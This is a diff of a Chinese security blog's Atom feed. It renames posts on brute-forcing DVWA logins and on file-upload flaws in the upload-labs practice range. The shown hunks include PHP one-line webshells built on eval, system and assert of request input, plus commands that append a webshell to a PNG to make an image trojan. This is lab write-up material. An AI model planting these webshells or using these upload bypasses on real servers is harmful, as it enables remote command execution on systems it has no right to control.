@@ -10,10 +10,10 @@
     </author>
     <updated>2024-07-09T15:57:11.000Z</updated>
     <entry>
-        <id>https://ph0ven1x.github.io/2024/07/09/%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/</id>
-        <title>认证爆破</title>
-        <link rel="alternate" href="https://ph0ven1x.github.io/2024/07/09/%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/"/>
-        <content type="html">&lt;h1 id=&#34;认证爆破总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#认证爆破总结&#34;&gt;#&lt;/a&gt; 认证爆破总结&lt;/h1&gt;
+        <id>https://ph0ven1x.github.io/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</id>
+        <title>暴力破解</title>
+        <link rel="alternate" href="https://ph0ven1x.github.io/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
+        <content type="html">&lt;h1 id=&#34;爆破破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆破破解&#34;&gt;#&lt;/a&gt; 爆破破解&lt;/h1&gt;
 &lt;h2 id=&#34;web认证爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web认证爆破&#34;&gt;#&lt;/a&gt; Web 认证爆破&lt;/h2&gt;
 &lt;h3 id=&#34;基础爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础爆破&#34;&gt;#&lt;/a&gt; 基础爆破&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;DVWA 爆破模块难度：low、medium&lt;/strong&gt;&lt;/p&gt;
@@ -225,11 +225,11 @@ FLUSH PRIVILEGES;
         <updated>2024-07-09T15:57:11.000Z</updated>
     </entry>
     <entry>
-        <id>https://ph0ven1x.github.io/2024/07/08/%E5%9B%BD%E5%85%89%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/</id>
-        <title>国光师傅的文件上传靶场</title>
-        <link rel="alternate" href="https://ph0ven1x.github.io/2024/07/08/%E5%9B%BD%E5%85%89%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/"/>
-        <content type="html">&lt;h1 id=&#34;国光的文件上传靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#国光的文件上传靶场&#34;&gt;#&lt;/a&gt; 国光的文件上传靶场&lt;/h1&gt;
-&lt;p&gt;靶场地址：&lt;a href=&#34;https://github.com/sqlsec/upload-labs-docker&#34;&gt;https://github.com/sqlsec/upload-labs-docker&lt;/a&gt;&lt;/p&gt;
+        <id>https://ph0ven1x.github.io/2024/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
+        <title>文件上传漏洞</title>
+        <link rel="alternate" href="https://ph0ven1x.github.io/2024/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h1&gt;
+&lt;p&gt;国光文件上传靶场地址：&lt;a href=&#34;https://github.com/sqlsec/upload-labs-docker&#34;&gt;https://github.com/sqlsec/upload-labs-docker&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;php一句话木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php一句话木马&#34;&gt;#&lt;/a&gt; php 一句话木马&lt;/h2&gt;
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;X&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt; // 代码执行    x=system(&#34;id&#34;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;X&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt; // 命令执行  x=id;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;assert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;X&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt; // 断言     x=system(&#34;id&#34;); php7.0包括7.0以前适用&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;前端js绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前端js绕过&#34;&gt;#&lt;/a&gt; 前端 JS 绕过&lt;/h2&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;image-20240707134138892.png&#34; alt=&#34;image-20240707134138892&#34; /&gt;&lt;/p&gt;
@@ -258,6 +258,7 @@ FLUSH PRIVILEGES;
 &lt;p&gt;连接一句话木马，获得 flag&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;image-20240707144831040.png&#34; alt=&#34;image-20240707144831040&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;文件头绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件头绕过&#34;&gt;#&lt;/a&gt; 文件头绕过&lt;/h2&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;image-20240717121612723.png&#34; alt=&#34;image-20240717121612723&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;生成图马&lt;/p&gt;
 &lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;copy pic.png/b+shell.php/b shell.png &lt;span class=&#34;token comment&#34;&gt;# windows&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; shell.php &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; pic.png &lt;span class=&#34;token comment&#34;&gt;# linux 追加到图片后面&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; pic.png shell.php &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; shell.png &lt;span class=&#34;token comment&#34;&gt;# linux&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; shell.php &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; pic.png &lt;span class=&#34;token comment&#34;&gt;# linux 追加到图片后&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上传图马，用 bp 看一下包，shell.png 改成 shell.php&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;image-20240707154452941.png&#34; alt=&#34;image-20240707154452941&#34; /&gt;&lt;/p&gt;
@@ -338,10 +339,8 @@ FLUSH PRIVILEGES;
 &lt;p&gt;上传成功，获得 flag&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;image-20240708231753273.png&#34; alt=&#34;image-20240708231753273&#34; /&gt;&lt;/p&gt;
 </content>
-        <category term="靶场" scheme="https://ph0ven1x.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
-        <category term="基础靶场" scheme="https://ph0ven1x.github.io/categories/%E9%9D%B6%E5%9C%BA/%E5%9F%BA%E7%A1%80%E9%9D%B6%E5%9C%BA/" />
+        <category term="Web安全" scheme="https://ph0ven1x.github.io/categories/Web%E5%AE%89%E5%85%A8/" />
         <category term="Web安全" scheme="https://ph0ven1x.github.io/tags/Web%E5%AE%89%E5%85%A8/" />
-        <category term="打靶" scheme="https://ph0ven1x.github.io/tags/%E6%89%93%E9%9D%B6/" />
         <category term="文件上传" scheme="https://ph0ven1x.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" />
         <updated>2024-07-08T15:57:11.000Z</updated>
     </entry>
